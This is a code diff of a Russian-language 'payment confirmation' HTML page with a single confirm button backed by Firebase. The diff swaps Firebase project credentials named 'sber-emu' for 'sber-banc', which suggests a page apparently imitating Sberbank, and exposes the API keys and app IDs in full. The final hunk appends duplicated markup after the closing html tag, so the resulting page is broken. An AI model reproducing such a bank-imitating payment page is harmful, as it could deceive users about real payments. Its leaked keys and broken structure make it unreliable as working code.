@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Подтверждение оплаты</title>
+<title>Подтверждение оплаты (by DimaKo)</title>
 <style>
   body {
     margin: 0;
@@ -51,21 +51,19 @@
 
 <!-- Firebase SDK -->
 <script type="module">
-  // Импортируем Firebase SDK
   import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
   import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-analytics.js";
   import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-database.js";
 
-  // Конфиг твоего Firebase
+  // 🔹 Твой Firebase-конфиг
   const firebaseConfig = {
-    apiKey: "AIzaSyBOKqaUE5Zi_ZSL7eSYyby_AjA603SOzQk",
-    authDomain: "sber-emu.firebaseapp.com",
-    databaseURL: "https://sber-emu-default-rtdb.firebaseio.com",
-    projectId: "sber-emu",
-    storageBucket: "sber-emu.firebasestorage.app",
-    messagingSenderId: "704050354843",
-    appId: "1:704050354843:web:9aec7c849444deb092843e",
-    measurementId: "G-GVXLTS6SL3"
+    apiKey: "AIzaSyAqgmvAb-msCN5xsimpXDuAg4FXOBLuEDA",
+    authDomain: "sber-banc.firebaseapp.com",
+    databaseURL: "https://sber-banc-default-rtdb.firebaseio.com",
+    projectId: "sber-banc",
+    storageBucket: "sber-banc.firebasestorage.app",
+    messagingSenderId: "17673551515",
+    appId: "1:17673551515:web:9d400bc82df02c63ed503e"
   };
 
   // Инициализация Firebase
@@ -102,6 +100,10 @@
 <div class="container">
   <h1>Подтвердить оплату?</h1>
   <button onclick="confirmPayment()">Подтвердить</button>
+  <div class="message"></div>
+</div>
+</body>
+</html>  <button onclick="confirmPayment()">Подтвердить</button>
   <div class="message"></div>
 </div>
 </body>
